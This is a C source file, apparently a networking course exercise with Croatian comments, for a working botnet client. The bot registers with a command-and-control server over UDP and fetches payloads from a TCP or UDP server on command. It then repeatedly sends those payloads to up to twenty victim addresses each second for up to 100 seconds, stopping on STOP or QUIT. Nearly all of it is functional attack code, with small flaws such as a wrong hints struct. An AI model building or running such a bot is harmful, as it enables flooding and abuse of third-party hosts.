#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <netinet/in.h>

int Socket(int family,int type,int protocol){
	int err;
	if((err=socket(family,type,protocol)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

int Getaddrinfo(const char *hostname,const char *service,const struct addrinfo *hints,struct addrinfo **result){
	int err;
	if((err=getaddrinfo(hostname,service,hints,result)) != 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

ssize_t Sendto(int sockfd,void *buff,size_t nbytes,int flags,const struct sockaddr* to,socklen_t addrlen){
	int err;
	if((err=sendto(sockfd,buff,nbytes,flags,to,addrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

ssize_t Recvfrom(int sockfd,void *buff,size_t nbytes,int flags,struct sockaddr *from,socklen_t *fromaddrlen){
	int err;
	if((err=recvfrom(sockfd,buff,nbytes,flags,from,fromaddrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

void substring(char *src,char *dst,int length,int position){
	int c=0;
	while (c < length) {
      *(dst+c) = *(src+c+position-1);
		c++;
	}
	*(dst+c) = '\0';
} 

int Connect(int sockfd,const struct sockaddr *server,socklen_t addrlen){
	int err;
	if((err=connect(sockfd,server,addrlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
} 

int Setsockopt(int sockfd,int level,int optname,const void *opval,socklen_t optlen){
	int err;
	if((err=setsockopt(sockfd,level,optname,opval,optlen)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
} 

int Getnameinfo(const struct sockaddr *sockaddr,socklen_t addrlen,
				char *host,size_t hostlen,char *serv,size_t servlen,int flags){
	int err;
	if((err=getnameinfo((struct sockaddr *)sockaddr,addrlen,
						host,hostlen,serv,servlen,flags)) != 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

ssize_t Send(int sockfd,void *buff,size_t nbytes,int flags){
	int err;
	if((err=send(sockfd,buff,nbytes,flags)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

ssize_t Recv(int sockfd,void *buff,size_t nbytes,int flags){
	int err;
	if((err=recv(sockfd,buff,nbytes,flags)) < 0){
		errx(1,"%s",gai_strerror(err));
	}
	return err;
}

int main(int argc, char *argv[]) {
	if(argc < 3){
		fprintf(stderr,"Usage: ./bot server_ip server_port\n");
		exit(1);
	}
	
	char server_ip[INET_ADDRSTRLEN]={'\0'}; //naziv ili IP adresa C&C posluzitelja 
	strcpy(server_ip,argv[argc-2]);
	char server_port[22]={'\0'}; //naziv ili broj UDP porta na kojem slusa C&C posluzitelj
	strcpy(server_port,argv[argc-1]);
	
	struct addrinfo hints;
	memset(&hints,0,sizeof(hints));
	struct addrinfo *res;
	int mysock;
	
	char buffer[4+1]="REG\n"; //bot nakon pokretanja posalje C&C posluzitelju, UDP datagram sadrzaja "REG\n"
	mysock=Socket(PF_INET,SOCK_DGRAM,0); //postavljamo svoj socket da salje pomocu UDP
	
	int broadcast = 1;
	Setsockopt(mysock,SOL_SOCKET,SO_BROADCAST,&broadcast,sizeof(broadcast));
	
	hints.ai_family=AF_INET;
	hints.ai_socktype=SOCK_DGRAM;
	Getaddrinfo(server_ip,server_port,&hints,&res); //radimo strukturu adrese za C&C posluzitelj
	
	Sendto(mysock,buffer,strlen(buffer),0,res->ai_addr,res->ai_addrlen);
	printf("poslano C&C posluzitelju: %s\n",buffer);
	
	char payload[1024+1]={'\0'};
	int prog=0;
	
	while(1){
		char MSG[1+20*INET_ADDRSTRLEN+20*22+1]; //slusa poruke od C&C posluzitelja i očekuje poruku u obliku strukture MSG
		int recv=Recvfrom(mysock,MSG,sizeof(MSG),0,res->ai_addr,&(res->ai_addrlen));
		
		char command=MSG[0];
		if(command == '0'){ // (QUIT) bot prestaje s radom
			printf("Bot prestaje s radom jer C&C poslao QUIT...\n");
			exit(0);
		}
		if(command == '1'){ // (PROG_TCP), spaja se na TCP posluzitelj na IP adresi i portu zapisanim u prvom sljedećem zapisu, salje poruku
							// "HELLO\n", učitava odgovor duljine najvise 1024 znaka te zatvara TCP konekciju
			char ip_tcp[INET_ADDRSTRLEN+1]={'\0'}; // ip od TCP posluzitelja
			char port_tcp[22+1]={'\0'}; // port od TCP posluzitelja
			substring(MSG,ip_tcp,INET_ADDRSTRLEN,2);
			substring(MSG,port_tcp,22,1+INET_ADDRSTRLEN+1);
			int mysock_tcp=Socket(PF_INET,SOCK_STREAM,0); // moj novi socket za TCP
			struct addrinfo hints2; 
			struct addrinfo *res2;
			memset(&hints2,0,sizeof(hints2));
			hints2.ai_family=AF_INET;
			hints2.ai_socktype=SOCK_STREAM;
			Getaddrinfo(ip_tcp,port_tcp,&hints2,&res2); // radimo strukturu adrese za TCP posluzitelj
			Connect(mysock_tcp,res2->ai_addr,res2->ai_addrlen); 
			printf("Spajam se na TCP posluzitelj:\n%s %s...\n", ip_tcp,port_tcp);
			char buff[6+1]="HELLO\n";
			Send(mysock_tcp,buff,strlen(buff),0);
			printf("TCP posluzitelju poslana poruka:\n%s\n", buff);
			Recv(mysock_tcp,payload,sizeof(payload),0);
			printf("Dobivena poruka od TCP posluzitelja:\n%s\n", payload);
			close(mysock_tcp);
			prog=1;
		}
		if(command == '2'){ // (PROG_UDP), na IP adresu i UDP port primljene u prvom idućem zapisu,
							// salje poruku "HELLO\n" te učitava odgovor duljine najvise 1024 znaka
			char ip_udp[INET_ADDRSTRLEN+1]={'\0'}; // ip od UDP posluzitelja
			char port_udp[22+1]={'\0'}; // port od UDP posluzitelja
			substring(MSG,ip_udp,INET_ADDRSTRLEN,2);
			substring(MSG,port_udp,22,1+INET_ADDRSTRLEN+1);
			struct addrinfo hints2; 
			struct addrinfo *res2;
			memset(&hints2,0,sizeof(hints2));
			hints2.ai_family=AF_INET;
			hints2.ai_socktype=SOCK_DGRAM;
			Getaddrinfo(ip_udp,port_udp,&hints2,&res2); // radimo strukturu adrese za UDP posluzitelj
			char buff[6+1]="HELLO\n";
			Sendto(mysock,buff,strlen(buff),0,res2->ai_addr,res2->ai_addrlen);
			printf("UDP posluzitelju poslana poruka:\n%s\n", buff);
			Recvfrom(mysock,payload,sizeof(payload),0,res2->ai_addr,&(res2->ai_addrlen));
			printf("Dobivena poruka od UDP posluzitelja:\n%s\n", payload);
			prog=1;
		}
		if(command == '3'){
			
							// (RUN), u primljenoj strukturi su u idućih M
							// zapisa (maksimalno 20 parova) upisane IP adrese i
							// portovi računala koje bot napada.
							// Prolazi po dobivenom popisu N payloadova te svaki
							// od njih salje jednom na svaku od zadanih M adresa. 
							// Svih M*N poruka ponovno salje svake sekunde, maksimalno 100 sekundi
							
			if(prog == 0) continue;
			int gotovo=0;
							
			int sek=100;
			int prvi_put=0;
			while(sek != 0){
				if(prvi_put == 0){
					prvi_put=1;
					if(payload[0] == '\n') break;
				}
				int position=0;		
				int jedan_payload=0;	
				while(((position+1) != strlen(payload)) && (jedan_payload == 0)){
					char payloadN[1024+1]={'\0'};
					int length=0;			
					for(;(payload[position] != ':') && (payload[position] != '\n');length++){ // trazi velicinu polja za payloadN
						position++;
					} 
					substring(payload,payloadN,length,position-length+1);
					
					if(payload[position] == '\n') jedan_payload=1; //jer ako ih ima vise imamo :\n, a ako je samo jedan onda nema :
					position++;
					int pairs=(recv-1)/(INET_ADDRSTRLEN+22);
					fd_set readfds;
					while(pairs > 0){
						struct timeval tv; // postavljamo stvari za select kako bi nadgledao da li ima podatak za citati na mysock
						tv.tv_sec = 0;
						tv.tv_usec = 50;	
						FD_ZERO(&readfds);
						FD_SET(mysock, &readfds);	
						
						char ip[INET_ADDRSTRLEN+1];
						char port[22+1];
						substring(MSG,ip,INET_ADDRSTRLEN,1+((pairs-1)*INET_ADDRSTRLEN)+((pairs-1)*22)+1);
						substring(MSG,port,22,1+((pairs-1)*INET_ADDRSTRLEN)+((pairs-1)*22)+INET_ADDRSTRLEN+1);
						struct addrinfo hints2;
						struct addrinfo *res2;
						memset(&hints2,0,sizeof(hints2));
						hints.ai_family=AF_INET;
						hints.ai_socktype=SOCK_DGRAM;
						Getaddrinfo(ip,port,&hints2,&res2);
					
						Sendto(mysock,payloadN,strlen(payloadN),0,res2->ai_addr,res2->ai_addrlen);
						pairs--;
						printf("poruka: %s poslana %s %s\n",payloadN,ip,port);
						
						int rv = select(mysock+1, &readfds, NULL, NULL, &tv); // gledamo da li na mysock ima nesto za procitati
						if (rv == -1) {
							perror("select"); 
						}  
						if (FD_ISSET(mysock, &readfds)) {
							struct sockaddr_in client;
							socklen_t clilen=sizeof(client);
							char buff[1+20*INET_ADDRSTRLEN+20*22+1]={'\0'};
							memset(buff,0,sizeof(buff));
							Recvfrom(mysock,buff,sizeof(buff),0,(struct sockaddr *)&client,&clilen);
							if(client.sin_addr.s_addr == ((struct sockaddr_in *)res->ai_addr)->sin_addr.s_addr){ // C&C posluzitelj poslao poruku
								if(buff[0] == '4'){ // (STOP) program bot prestaje sa slanjem poruka zrtvama
									printf("Bot prestaje sa slanjem jer C&C poslao STOP...\n");
									gotovo=1;
									break;
								}
								if(buff[0] == '0'){
									printf("Bot prestaje s radom jer C&C poslao QUIT...\n");
									exit(0);
								} 
							}
							else{ // Kad bilo koja zrtva vrati neki podatak botu on prestaje sa slanjem poruka
								char hostname[NI_MAXHOST];
								char servicename[NI_MAXSERV];
								Getnameinfo((struct sockaddr *)&client,sizeof(struct sockaddr_in),hostname,sizeof(hostname),
								servicename,sizeof(servicename),0);
								printf("Bot prestaje sa slanjem jer mu zrtva %s %s poslala poruku...\n",hostname,servicename);
								gotovo=1;
								break;
							}
						}
					}
					if(gotovo == 1) break;
					printf("poruka: %s poslana svima\n",payloadN);
				}
				if(gotovo == 1) break;
				printf("poslano N poruka na M adresa\n");
				sek--;
				sleep(1);
				printf("\n");
			}
		}
	}
}
